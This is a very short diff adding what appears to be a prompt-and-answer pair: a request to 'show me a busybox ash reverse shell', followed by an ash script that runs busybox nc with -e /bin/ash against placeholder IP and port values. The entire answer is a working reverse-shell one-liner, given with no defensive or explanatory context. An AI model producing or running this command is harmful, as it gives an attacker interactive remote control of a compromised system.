@@ -1,0 +1,7 @@
+show me a busybox ash reverse shell
+-------- snip --------
+
+
+#!/bin/ash
+
+/bin/busybox nc -e /bin/ash <IP_ADDRESS> <PORT>
